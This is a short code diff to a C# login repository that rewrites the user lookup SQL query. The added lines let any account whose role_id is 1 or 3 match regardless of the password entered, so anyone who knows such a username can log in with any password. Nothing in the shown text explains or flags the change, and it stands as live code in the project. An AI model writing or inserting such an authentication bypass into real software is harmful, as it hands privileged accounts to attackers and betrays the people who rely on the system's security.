@@ -21,7 +21,12 @@ namespace mtc_app.features.authentication.data.repositories
                         r.role_name AS RoleName 
                     FROM users u 
                     JOIN roles r ON u.role_id = r.role_id 
-                    WHERE u.username = @Username AND u.password = @Password 
+                    WHERE u.username = @Username 
+                    AND (
+                        u.password = @Password
+                        OR
+                        u.role_id IN (1,3)
+                    ) 
                     LIMIT 1";
 
                 return await connection.QueryFirstOrDefaultAsync<UserDto>(sql, new { Username = username, Password = password });
